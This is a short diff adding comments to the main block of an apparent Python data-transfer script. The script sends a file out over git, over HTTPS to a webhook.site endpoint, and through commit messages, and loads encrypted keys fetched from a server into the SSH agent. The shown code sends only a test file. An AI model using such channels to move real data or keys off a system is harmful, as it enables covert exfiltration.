@@ -95,10 +95,11 @@ def recv(remote_url):
 		get_commit_message()
 
 if __name__=="__main__":
-	#fetch_keys(SERVER)
-	#init_git_keys()
+	#fetch_keys(SERVER)#these two lines get the encrypted keys and decrypts them
+	#init_git_keys()#this adds it to the ssh agent 
 
-	send_git_file("test.json")
+	send_git_file("test.json")#these are commands to send/receive data
 	send_https_file("test.json","https://webhook.site/ff3193e4-77b4-42c7-8787-afb64168e494", DNS_RESOLVER)	
 	send_commit_message("Test")
 	recv(None)
+        #for instruction on this, see the readme documentation
